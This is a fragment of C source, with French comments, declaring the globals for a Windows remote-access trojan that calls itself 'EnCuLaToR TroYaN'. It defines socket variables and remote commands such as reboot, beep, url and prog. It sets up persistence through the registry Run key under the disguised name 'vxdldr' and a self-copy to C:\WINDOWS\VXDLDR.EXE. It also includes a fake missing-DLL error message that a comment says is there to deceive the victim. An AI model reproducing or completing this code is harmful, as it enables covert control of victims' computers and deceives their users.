

//les couleurs:
//--------------

COLORREF macolor  = RGB (0,0,140);
COLORREF blanc    = RGB (255,255,255);
COLORREF noir     = RGB (0,0,0);
HDC hdc;

// Hinstance et Hwnd:
//--------------------

HINSTANCE  hInst   = NULL;
HWND	   hwnd    = NULL;


//Variables relatives aux sockets:
//---------------------------------


SOCKET   s;
SOCKET   sok;
WSADATA  wsaData;
WORD     verreq;
struct   sockaddr_in sin;
struct   sockaddr_in info;
int len = sizeof(SOCKADDR_IN);
int recu = 1;


//buffers initialis�s:
//---------------------


char message   [] = "reboot\r\n";
char open      [] = "open\r\n";
char close     [] = "close\r\n";
char beep      [] = "beep\r\n";
char chat      [] = "chat\r\n";
char url       [] = "url\r\n";
char prog      [] = "prog\r\n";
char parle     [] = "parle\r\n";
char nom       [] = "nom\r\n";
char bon       [] = "OK\r\n";

char signature []="EnCuLaToR TroYaN\r\n";

//buffers non-initialis�s:
//-------------------------

char buf    [100];
char dixit  [100];
char theurl [150];
char theprog[150];
char parole [100];
char titre  [100];
char thenom [100];

//autres:
//--------

DWORD size = 100;

//Datas utiles � l'installation du troyan:
//-----------------------------------------

//fichiers:
HKEY zehandle;
DWORD zeresult;

//base de registre:
char reg[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char namereg[]="vxdldr";

//chemin du nouveau server copi�:
char thedir[] = "C:\\WINDOWS\\VXDLDR.EXE";
char dir[100];  //chemin d'�x�cution

//boite de message pour tromper la victime:
char erreur[]  ="Erreur de d�marrage du programme";
char caption[] ="Un fichier .DLL requis, MSVMBM2.DLL, n'a pas �t� trouv�.";

